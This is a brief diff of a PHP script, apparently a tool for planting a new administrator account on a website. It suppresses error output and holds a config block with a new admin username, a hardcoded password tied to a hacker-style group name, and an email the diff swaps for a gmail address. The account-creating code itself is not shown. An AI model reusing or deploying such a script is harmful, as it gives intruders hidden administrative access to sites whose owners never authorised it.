@@ -4,9 +4,9 @@ error_reporting(0);
 ini_set('display_errors', 0);
 
 // === KONFIGURASI ===
-$new_username = 'admin_hellroot';
+$new_username = 'adminns';
 $new_password = 'HellR00ters@2024!';
-$new_email    = 'admin_hellroot@hellrooters.com';
+$new_email    = 'peler9293@gmail.com';
 
 echo '<!DOCTYPE html>
 <html lang="en">
